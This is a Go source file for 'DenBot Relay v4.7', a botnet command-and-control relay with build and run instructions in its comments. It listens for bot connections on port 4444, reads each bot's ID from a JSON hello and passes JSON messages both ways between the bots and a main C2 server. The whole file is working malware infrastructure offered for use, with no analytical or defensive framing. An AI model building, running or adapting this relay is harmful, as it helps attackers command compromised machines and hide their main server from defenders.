// DenBot Relay v4.7 - transparent relay layer between agents and main C2
// build: go build -o denbot-relay denbot-relay.go
// run: ./denbot-relay -port 4444 -main_c2 "mainserver.local:5555"

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"time"
)

var (
	port   = flag.Int("port", 4444, "relay listen port")
	mainC2 = flag.String("main_c2", "localhost:5555", "main C2 address")
)

func main() {
	flag.Parse()

	fmt.Println("╔════════════════════════════════════════════╗")
	fmt.Println("║      DenBot Relay v4.7 (transparent)       ║")
	fmt.Println("╚════════════════════════════════════════════╝")
	fmt.Printf("[*] Listening on :%d\n", *port)
	fmt.Printf("[*] Forwarding to %s\n", *mainC2)

	addr := fmt.Sprintf(":%d", *port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Println("[!] listen:", err)
		os.Exit(1)
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleBot(conn)
	}
}

func handleBot(botConn net.Conn) {
	defer botConn.Close()
	_ = botConn.SetReadDeadline(time.Now().Add(15 * time.Second))

	mainConn, err := net.DialTimeout("tcp", *mainC2, 10*time.Second)
	if err != nil {
		fmt.Printf("[!] Failed to connect to main C2: %v\n", err)
		return
	}
	defer mainConn.Close()

	botDecoder := json.NewDecoder(botConn)
	botEncoder := json.NewEncoder(botConn)
	mainEncoder := json.NewEncoder(mainConn)
	mainDecoder := json.NewDecoder(mainConn)

	var hello interface{}
	if err := botDecoder.Decode(&hello); err != nil {
		return
	}

	helloMap, ok := hello.(map[string]interface{})
	if !ok {
		return
	}

	botID, _ := helloMap["id"].(string)
	if botID == "" {
		return
	}

	fmt.Printf("[+] Bot %s connected via relay\n", botID)

	mainEncoder.Encode(hello)

	defer func() {
		fmt.Printf("[-] Bot %s disconnected\n", botID)
	}()

	go relayFromMain(mainDecoder, botEncoder)

	for {
		_ = botConn.SetReadDeadline(time.Now().Add(120 * time.Second))
		var msg interface{}
		if err := botDecoder.Decode(&msg); err != nil {
			return
		}
		mainEncoder.Encode(msg)
	}
}

func relayFromMain(mainDecoder *json.Decoder, botEncoder *json.Encoder) {
	for {
		var msg interface{}
		if err := mainDecoder.Decode(&msg); err != nil {
			return
		}
		botEncoder.Encode(msg)
	}
}
